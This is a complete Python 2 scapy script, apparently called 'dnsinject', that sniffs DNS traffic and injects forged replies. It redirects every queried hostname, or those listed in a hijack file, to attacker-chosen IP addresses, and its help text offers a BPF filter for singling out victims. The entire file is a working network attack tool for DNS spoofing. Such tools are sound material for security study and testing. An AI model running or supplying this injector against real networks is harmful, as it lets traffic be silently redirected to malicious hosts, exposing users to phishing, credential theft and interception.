#!/usr/bin/env python
from scapy.all import *
import argparse
import socket
import netifaces as ni

hosts = {}
sock = None
ip_address = None

def get_spoofed_ip(packet):
    spoofed_ip = None
    if DNSRR not in packet:
        print "\nDNS query for " + packet[DNSQR].qname
        if len(hosts) == 0:
            spoofed_ip = ip_address
        elif packet[DNSQR].qname[:-1] in hosts:
            spoofed_ip = hosts[packet[DNSQR].qname[:-1]]
            print "Hostname to be hijacked detected! Injecting forged response"
    return spoofed_ip

def construct_spoofed_packet(packet, spoofed_ip):
   return IP(dst = packet[IP].src, src = packet[IP].dst) \
              / UDP(dport = packet[UDP].sport, sport = 53) \
              / DNS(id = packet[DNS].id,
                    qr = 1L,
                    qd = DNSQR(qname = packet[DNSQR].qname),
                    an = DNSRR(rrname = packet[DNS].qd.qname, rdata = spoofed_ip)
                )

def process_packet(packet):
    spoofed_ip = get_spoofed_ip(packet)
    if spoofed_ip == None:
        return
    spoofed_packet = construct_spoofed_packet(packet, spoofed_ip)

    sent = sock.sendto(str(spoofed_packet), (packet[IP].src, packet[UDP].sport))
    print "Spoofed Packet injected"

def main():
    global sock, ip_address, hosts
    parser = argparse.ArgumentParser(description='DNS packet injector', add_help = False)

    parser.add_argument("-i", help = "Listen on network device <interface> (e.g., eth0). If not specified,\
                        dnsinject selects a default interface to listen on.",
                        type = str, required = False, default = None)

    parser.add_argument("-h", help = "Read a list of IP address and hostname pairs specifying the hostnames to\
                        be hijacked. If '-h' is not specified, dnsinject forges replies for\
                        all observed requests with the local machine's IP address as an answer.",
                        type = str, required = False, default = None)

    parser.add_argument("expression", help = "A BPF filter that specifies a subset of the traffic to be\
                        monitored. This option is useful for targeting a single or a set of particular\
                        victims.", nargs='?', type = str, default = None)

    args = parser.parse_args()

    print "Starting DNS packet injector"

    if args.h is not None:
        f = open(args.h, 'r')
        for line in f:
            line = line.split()
            if len(line) != 2:
                continue
            hosts[line[1].strip()] = line[0].strip()
        f.close()

    if len(hosts) == 0:
        print "Mode: Forging replies for all observed DNS requests"
    else:
        print "Mode: Forging replies for DNS requests with following hosts"
        print hosts

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    if args.i is None:
        ip_address = ni.ifaddresses(conf.iface)[2][0]['addr']
    else:
        ip_address = ni.ifaddresses(args.i)[2][0]['addr']

    if args.expression is None:
        args.expression = "udp port 53"
    else:
        args.expression += " and udp port 53"

    sniff(iface = args.i, filter = args.expression, prn = process_packet)

if __name__ == "__main__":
    main()
